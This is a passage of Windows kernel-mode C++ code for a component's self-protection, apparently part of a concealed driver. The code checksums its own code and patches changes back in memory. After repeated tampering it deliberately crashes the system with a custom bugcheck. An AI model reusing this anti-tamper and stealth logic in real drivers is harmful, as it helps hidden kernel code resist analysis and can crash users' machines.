        SN_LOG("self_protect::apply_stealth: complete");
    }


    inline PUCHAR          g_own_shadow_copy  = nullptr;


    inline volatile LONG   g_own_integrity_strikes = 0;
    constexpr LONG         OWN_INTEGRITY_STRIKE_THRESHOLD = 5;

    __forceinline bool init_baseline(PVOID own_code_base, ULONG own_code_size) {
        SN_LOG("self_protect::init_baseline: base=%p size=0x%lx", own_code_base, own_code_size);
        if (!own_code_base || own_code_size == 0) {
            SN_LOG("self_protect::init_baseline: FAIL - null base or zero size");
            return false;
        }

        g_own_code_base = own_code_base;
        g_own_code_size = own_code_size;


        g_own_shadow_copy = static_cast<PUCHAR>(
            ExAllocatePool2(POOL_FLAG_NON_PAGED, own_code_size, 'sCmM')
        );
        if (g_own_shadow_copy) {
            __try {
                RtlCopyMemory(g_own_shadow_copy, own_code_base, own_code_size);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                SN_LOG("self_protect::init_baseline: EXCEPTION copying shadow");
                ExFreePoolWithTag(g_own_shadow_copy, 'sCmM');
                g_own_shadow_copy = nullptr;
            }
        } else {
            SN_LOG("self_protect::init_baseline: shadow alloc failed");
        }

        g_own_baseline_crc = integrity::compute_crc32(own_code_base, own_code_size);
        SN_LOG("self_protect::init_baseline: crc=0x%08lx", g_own_baseline_crc);

        if (g_own_baseline_crc == 0) {
            SN_LOG("self_protect::init_baseline: FAIL - CRC is zero");
            return false;
        }

        _InterlockedExchange(&g_initialized, 1);
        SN_LOG("self_protect::init_baseline: SUCCESS");
        return true;
    }


    __forceinline bool verify_own_integrity() {
        if (!_InterlockedCompareExchange(&g_initialized, 1, 1))
            return true;

        PVOID base = (PVOID)g_own_code_base;
        ULONG size = g_own_code_size;

        if (!base || size == 0 || !_MmIsAddressValid(base))
            return true;

        UINT32 current_crc = integrity::compute_crc32(base, size);

        if (current_crc != g_own_baseline_crc) {
            SN_LOG("self_protect::verify: CRC mismatch own=0x%08lx current=0x%08lx",
                g_own_baseline_crc, current_crc);


            ULONG diff_offset = (ULONG)-1;
            if (g_own_shadow_copy) {
                const UCHAR* current = static_cast<const UCHAR*>(base);
                __try {
                    for (ULONG i = 0; i < size; i++) {
                        if (current[i] != g_own_shadow_copy[i]) {
                            diff_offset = i;
                            break;
                        }
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    diff_offset = (ULONG)-1;
                }
            }

            if (diff_offset != (ULONG)-1) {
                UCHAR* diff_addr = static_cast<UCHAR*>(base) + diff_offset;


                UCHAR modified_bytes[16] = {};
                ULONG bytes_to_read = min(16UL, size - diff_offset);
                __try {
                    RtlCopyMemory(modified_bytes, diff_addr, bytes_to_read);
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    goto own_count_strike;
                }

                PVOID hook_dest = dispatch_guard::resolve_hook_destination(
                    modified_bytes, diff_addr);

                if (hook_dest && dispatch_guard::is_address_in_loaded_module(hook_dest)) {

                    g_own_baseline_crc = current_crc;
                    if (g_own_shadow_copy) {
                        __try {
                            RtlCopyMemory(g_own_shadow_copy, base, size);
                        } __except (EXCEPTION_EXECUTE_HANDLER) {}
                    }
                    _InterlockedExchange(&g_own_integrity_strikes, 0);
                    return true;
                }


                if (g_own_shadow_copy) {
                    bool restored = safe_write_memory(
                        diff_addr, g_own_shadow_copy + diff_offset,
                        min((ULONG)64, size - diff_offset));

                    if (restored) {
                        UINT32 after_crc = integrity::compute_crc32(base, size);
                        if (after_crc == g_own_baseline_crc) {
                            _InterlockedExchange(&g_own_integrity_strikes, 0);
                            return true;
                        }
                    }
                }
            }

        own_count_strike:
            LONG strikes = _InterlockedIncrement(&g_own_integrity_strikes);
            if (strikes >= OWN_INTEGRITY_STRIKE_THRESHOLD) {
                if (_KeBugCheckEx) {
                    _KeBugCheckEx(
                        0xDEAD5E08,
                        (ULONG_PTR)base,
                        (ULONG_PTR)g_own_baseline_crc,
                        (ULONG_PTR)current_crc,
                        (ULONG_PTR)0
                    );
                }
                return false;
            }
            return true;
        }


        _InterlockedExchange(&g_own_integrity_strikes, 0);
        return true;
    }
}
